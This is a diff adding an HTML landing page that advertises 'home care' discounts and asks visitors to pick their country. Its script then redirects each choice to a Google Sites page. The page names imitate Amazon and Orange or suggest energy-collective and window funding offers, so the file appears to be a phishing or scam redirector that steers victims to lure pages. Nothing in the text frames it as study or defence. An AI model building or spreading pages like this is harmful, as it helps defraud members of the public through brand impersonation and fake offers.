@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home Care Promotional Offers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #007bff;
+            color: white;
+            text-align: center;
+            padding: 20px 10px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        h1, h2 {
+            color: #007bff;
+        }
+        .offers {
+            margin-bottom: 30px;
+        }
+        .offers p {
+            line-height: 1.6;
+        }
+        .country-selector {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .country-selector select {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            margin-top: 20px;
+            background: #007bff;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Discover the Best Home Care Offers</h1>
+    </header>
+
+    <div class="container">
+        <div class="offers">
+            <h2>Welcome to Our Exclusive Offers</h2>
+            <p>We provide tailored home care offers designed to suit your needs. Enjoy discounts on repairs, renovations, and maintenance services in your area. Choose your country to access the best deals available to you.</p>
+        </div>
+
+        <div class="country-selector">
+            <h2>Select Your Country</h2>
+            <select id="country-select" onchange="redirectToCountry()">
+                <option value="">-- Select Your Country --</option>
+                <option value="US">United States</option>
+                <option value="UK">United Kingdom</option>
+                <option value="FR">France</option>
+                <option value="IT">Italy</option>
+                <option value="NL">Netherlands</option>
+            </select>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 Home Care Promotions. All Rights Reserved.</p>
+    </footer>
+
+    <script>
+        function redirectToCountry() {
+            const country = document.getElementById("country-select").value;
+            const urls = {
+                US: "https://sites.google.com/view/card-aamazon/home",
+                UK: "https://sites.google.com/view/dontmissi/home",
+                FR: "https://sites.google.com/view/orangecadeux/home",
+                IT: "https://sites.google.com/view/scottishwindowsdoorsfunding/home",
+                NL: "https://sites.google.com/view/nationaalenergiecollectief/home",
+            };
+
+            if (country && urls[country]) {
+                window.location.href = urls[country];
+            } else {
+                alert("Please select a valid country.");
+            }
+        }
+    </script>
+</body>
+</html>
